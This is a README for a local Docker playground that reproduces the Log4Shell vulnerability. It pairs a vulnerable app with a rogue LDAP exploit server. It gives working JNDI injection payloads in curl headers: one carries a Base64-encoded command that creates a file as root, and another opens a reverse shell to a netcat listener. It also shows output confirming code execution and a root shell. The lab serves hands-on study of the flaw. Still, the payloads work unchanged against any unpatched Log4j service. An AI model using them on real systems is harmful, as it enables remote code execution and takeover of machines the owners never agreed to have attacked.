full playground setup for log4shell using [this great app and documentation](https://github.com/christophetd/log4shell-vulnerable-app) ([their blog post](https://www.cynet.com/log4shell/))and [this rogue LDAP server](https://codechina.csdn.net/mirrors/feihong-cs/JNDIExploit.git) (codechina mirror as it was removed from github)

Both projects copied into this repo and original README/LICENSEs kept under each.

## Quickstart

* Launch the *lab*
```
docker compose up
```
* Send payload to *vulnapp`
```
curl 127.0.0.1:40000 -H 'X-Api-Version: ${jndi:ldap://ldap:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```
* Verify payload executed
```
docker compose exec vulnapp ls -l /tmp/pwned
-rw-r--r--    1 root     root             0 Dec 14 01:43 /tmp/pwned
```

Check [JNDIExploit README](JNDIExploit/README.md) for more options (paths), such as reverse shell:

1. Install `bash` in vulnapp (does not work with alpine `sh`): `docker compose exec apk add bash`
1. Start netcat on ldap container (but can be anywhere) `docker compose exec ldap nc -nvlp 7677`
1. Use `/Reverseshell` path: `curl 127.0.0.1:40000 -H 'X-Api-Version: ${jndi:ldap://ldap:1389/Basic/ReverseShell/ldap/7677}'`
1. Enjoy the shell
```
listening on [::]:7677 ...
connect to [::ffff:172.19.0.2]:7677 from [::ffff:172.19.0.3]:38094 ([::ffff:172.19.0.3]:38094)
bash-4.4#
```
